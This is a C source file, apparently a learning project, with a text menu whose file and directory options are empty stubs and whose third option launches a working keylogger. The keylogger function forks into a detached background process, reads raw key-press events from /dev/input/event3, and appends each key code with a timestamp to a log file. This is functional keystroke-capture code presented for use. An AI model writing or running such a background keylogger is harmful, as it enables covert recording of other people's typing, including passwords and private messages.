#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>

// Keylogger function declaration
void keylogger(const char *logfile);

void file_operations_menu();
void directory_operations_menu();
void keylogger_operations_menu();

int main() 
{
int choice;
while (1) 
{

printf("\n=== SUPER COMMAND MENU ===\n");
printf("1. File Operations\n");
printf("2. Directory Operations\n");
printf("3. Keylogger Operations\n");
printf("0. Exit\n");
printf("Enter your choice: ");
scanf("%d", &choice);

switch (choice) 
{
case 1:
file_operations_menu();
break;

case 2:
directory_operations_menu();
break;

case 3:
keylogger_operations_menu();
break;

case 0:
printf(" Exiting program. Goodbye!\n");
return 0;
default:
printf(" Invalid choice! Please try again.\n");
}
}
}

void file_operations_menu() 
{
int choice;
while(1)
{
printf("\n=== File Operations Menu ===\n");
printf("1. Create/ Open File\n");
printf("2. Change File Permission\n");
printf("3. Read from File\n");
printf("4. Write to File\n");
printf("5. Delete File\n");
printf("0. Back to Main Menu\n");
printf("Enter your choice: ");
scanf("%d", &choice);

switch (choice) 
{
case 1: 
printf(" Selected: Create/Open File\n");
break;

case 2:
printf(" Selected: Change File Permission\n");
break;

case 3:
printf(" Selected: Read from File\n");
break;

case 4:
printf(" Selected: Write to File\n");
break;

case 5:
printf(" Selected: Delete File\n");
break;

case 0:
return;
default:
printf("Invalid choice! Please try again.\n");
}
}
}

void directory_operations_menu() 
{
int choice;

while (1) 
{
printf("\n=== Directory Operations Menu ===\n");
printf(" 1. Create Directory\n");
printf(" 2. Delete Directory\n");
printf(" 3. Print Current Directory\n");
printf(" 4. List Files in Directory\n");
printf(" 0. Back to Main Menu\n");
printf(" Enter your choice: ");
scanf ("%d", &choice);

switch (choice) 
{
case 1: 
printf(" Selected: Create Directory\n");
break;

case 2: 
printf(" Selected: Delete Directory\n");
break;

case 3:
printf(" Selected: Print Current Working Directory\n");
break;

case 4:
printf(" Selected: List Files in Directory\n");
break;

case 0:
return;
default:
printf(" Invalid choice! PLease try again.\n");
}
}
}

// Keylogger menu function
void keylogger_operations_menu() {
    char logfile[256];
    printf("\n=== Keylogger Operations ===\n");
    printf("Enter the log file name (e.g., keylog.txt): ");
    scanf("%s", logfile);

    printf("Starting keylogger... Log file: %s\n", logfile);
    keylogger(logfile);  // Call the keylogger function
}

// Keylogger function implementation
void keylogger(const char *logfile) {
    const char *device = "/dev/input/event3";  // Replace with the correct event file
    struct input_event event;

    // Fork the process to run in the background
    pid_t pid = fork();
    if (pid < 0) {
        perror("Error forking process");
        return;
    }
    if (pid > 0) {
        // Parent process exits, allowing child to run in background
        printf("Keylogger running in the background. PID: %d\n", pid);
        return;
    }

    // Child process (daemon)
    setsid();  // Create a new session
    int fd = open(device, O_RDONLY);
    if (fd == -1) {
        perror("Error opening device file");
        printf("Ensure you have the correct permissions or run as root.\n");
        exit(EXIT_FAILURE);
    }

    FILE *log = fopen(logfile, "a");
    if (!log) {
        perror("Error opening log file");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Add a timestamp at the start of the session
    time_t now = time(NULL);
    fprintf(log, "Session started: %s\n", ctime(&now));
    fflush(log);

    // Continuously read keystrokes and log them
    while (1) {
        if (read(fd, &event, sizeof(struct input_event)) > 0) {
            if (event.type == EV_KEY && event.value == 1) { // Key press event
                fprintf(log, "Key %d pressed at %ld\n", event.code, time(NULL));
                fflush(log);  // Ensure data is written immediately
            }
        }
    }

    fclose(log);
    close(fd);
}

